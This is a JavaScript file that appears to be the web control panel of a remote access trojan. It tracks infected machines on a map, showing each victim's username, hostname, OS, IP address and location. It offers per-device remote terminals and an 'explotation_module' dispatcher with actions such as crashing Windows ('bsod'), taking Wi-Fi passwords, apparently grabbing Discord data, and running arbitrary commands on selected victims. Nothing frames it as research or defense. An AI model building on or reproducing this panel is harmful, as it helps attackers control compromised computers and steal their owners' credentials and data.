// Initialize the map
const map = L.map("map").setView([39.8283, -98.5795], 4); // Centered on the USA

// Add OpenMapTiles layer
L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
  maxZoom: 19,
  attribution: "© OpenStreetMap contributors",
}).addTo(map);

function deepEqual(obj1, obj2) {
  return JSON.stringify(obj1) === JSON.stringify(obj2);
}

if (!show_logout_button) {
  document.querySelector('li > a[href="/logout"]').parentElement.style.display = 'none';
}

old_data = {};
// Function to update the table and map with new data
async function updateDevices() {
  try {
    const response = await fetch("/devices", { method: "POST" });
    const data = await response.json();

    if (!deepEqual(data, old_data)) {
      old_data = data;

      const tableBody = document.getElementById("device-table");
      tableBody.innerHTML = ""; // Clear existing table rows

      Object.keys(data).forEach((clientId) => {
        const clientData = data[clientId];

        const osType = clientData.platform[0];
        const osLogo =
          osType === "Linux"
            ? "https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg"
            : osType === "Darwin"
            ? "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
            : osType === "Windows"
            ? "https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg"
            : osType === "FreeBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/4/40/Daemon-phk.svg"
            : osType === "OpenBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/a/ad/Puffy.jpg"
            : osType === "Solaris"
            ? "https://upload.wikimedia.org/wikipedia/commons/d/d2/Icon-sun-solaris_os.svg"
            : osType === "Android"
            ? "https://upload.wikimedia.org/wikipedia/commons/2/26/Android_Robot_Head_2023.svg"
            : "https://static-00.iconduck.com/assets.00/unknown-os-20px-icon-512x512-brbzte7w.png"; // Default logo for other/unknown OS

        try {
          // Add a marker to the map
          L.marker([
            clientData.geolocation.latitude,
            clientData.geolocation.longitude,
          ])
            .addTo(map)
            .bindPopup(
              `<b>${clientData.username}</b><br>${clientData.hostname}`
            )
            .openPopup();
        } catch {
          ("Unable to locate geolocaction");
        }

        // Add a row to the table
        const row = document.createElement("tr");
        if (private_public) {ip_state = clientData.private_ip} else {ip_state = clientData.public_ip}
        row.innerHTML = `
                  <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                  <td>${clientData.username}</td>
                  <td>${clientData.geolocation.address}</td>
                  <td>${clientData.status}</td>
                  <td><img src="${osLogo}" type="os" alt="${osType}">${osType}</td>
                  <td>${ip_state}</td>
                  <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
                  <td><img src='https://upload.wikimedia.org/wikipedia/commons/9/9c/Trash-can_-_Delapouite_-_game-icons.svg' class='trashcan-icon' alt='Delete icon' id='delete' data-row-id="${clientId}"></td>
              `;
        tableBody.appendChild(row);
      });
    }
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

// Call updateDevices to initially load the data
updateDevices();

setInterval(updateDevices, 1000);

function send_pem() {
  dropdown = document.getElementById("pem-dropdown").value;
  checkboxes = document.querySelectorAll(".row-select");

  // Create an array to store the IDs of selected rows
  selectedElements = [];

  // Loop through the checkboxes
  checkboxes.forEach((checkbox) => {
    // Check if the checkbox is checked
    if (checkbox.checked) {
      // Add the row ID to the selectedElements array
      selectedElements.push(checkbox.dataset.rowId);
    }
  });

  console.log(selectedElements);

  fetch("/explotation_module", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      explotation_module: dropdown,
      uids: selectedElements,
      input: document.getElementById("pem-input").value,
    }),
  })
    .then((response) => {
      console.log("Response from server:", response);
      updateDevices();
    })
    .catch((error) => {
      console.error("Error sending delete request:", error);
    });
}

// Add event listeners for connect and delete icons
document.addEventListener("click", (event) => {
  if (event.target.id === "connect") {
    const rowId = event.target.dataset.rowId;
    console.log(`Connect clicked for device ID: ${rowId}`);
    window.location.href = "/terminal/" + rowId;
    // Add logic to handle connect event here
  } else if (event.target.id === "delete") {
    const rowId = event.target.dataset.rowId;
    fetch("/delete", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ device_id: rowId }),
    })
      .then((response) => {
        console.log("Response from server:", response);
        // Handle the response here (e.g., update the UI)
      })
      .catch((error) => {
        console.error("Error sending delete request:", error);
      });
  }
});

document
  .getElementById("select-all-os")
  .addEventListener("change", function () {
    const isChecked = this.checked;
    document.querySelectorAll(".row-select").forEach((checkbox) => {
      checkbox.checked = isChecked;
    });
  });

document.getElementById("select-osx").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    const rowId = checkbox.dataset.rowId;
    const row = document
      .querySelector(`[data-row-id="${rowId}"]`)
      .closest("tr");
    console.log(row.children);
    const osType = row.querySelector("td:nth-child(5)").innerText.trim(); // Get OS type from the table row

    // Check if the OS matches the selected ones
    if (osType.includes("Darwin")) {
      checkbox.checked = isChecked;
    }
  });
});

document.getElementById("select-linux").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    const rowId = checkbox.dataset.rowId;
    const row = document
      .querySelector(`[data-row-id="${rowId}"]`)
      .closest("tr");
    console.log(row.children);
    const osType = row.querySelector("td:nth-child(5)").innerText.trim(); // Get OS type from the table row

    // Check if the OS matches the selected ones
    if (osType.includes("Linux")) {
      checkbox.checked = isChecked;
    }
  });
});

document
  .getElementById("select-windows")
  .addEventListener("change", function () {
    const isChecked = this.checked;
    document.querySelectorAll(".row-select").forEach((checkbox) => {
      const rowId = checkbox.dataset.rowId;
      const row = document
        .querySelector(`[data-row-id="${rowId}"]`)
        .closest("tr");
      console.log(row.children);
      const osType = row.querySelector("td:nth-child(5)").innerText.trim(); // Get OS type from the table row

      // Check if the OS matches the selected ones
      if (osType.includes("Windows")) {
        checkbox.checked = isChecked;
      }
    });
  });

const pem_dropdown = document.getElementById("pem-dropdown");
const pem_input = document.getElementById("pem-input");
const pem_windows = document.getElementById("pem-windows");
const pem_linux = document.getElementById("pem-linux");
const pem_osx = document.getElementById("pem-osx");
// Function to update architecture dropdown
function updateArchDropdown() {
  const selected_input = pem_dropdown.value;
  if (selected_input === "send-command") {
    pem_input.style.display = "block";
    pem_windows.style.display = "block";
    pem_linux.style.display = "block";
    pem_osx.style.display = "block";
  } else {
    pem_input.style.display = "none";
  }
  if (selected_input === "bsod") {
    pem_windows.style.display = "block";
    pem_linux.style.display = "none";
    pem_osx.style.display = "none";
  }
  if (selected_input === "discord") {
    pem_windows.style.display = "block";
    pem_linux.style.display = "none";
    pem_osx.style.display = "none";
  }
  if (selected_input === "wifi-password") {
    pem_windows.style.display = "block";
    pem_linux.style.display = "none";
    pem_osx.style.display = "none";
  }
  if (selected_input === "send-command") {
    pem_windows.style.display = "block";
    pem_linux.style.display = "block";
    pem_osx.style.display = "block";
  }
  if (selected_input === "restart") {
    pem_windows.style.display = "block";
    pem_linux.style.display = "block";
    pem_osx.style.display = "block";
  }
}

// Initial update of architecture dropdown
updateArchDropdown();

// Add event listener to OS dropdown
pem_dropdown.addEventListener("change", updateArchDropdown);
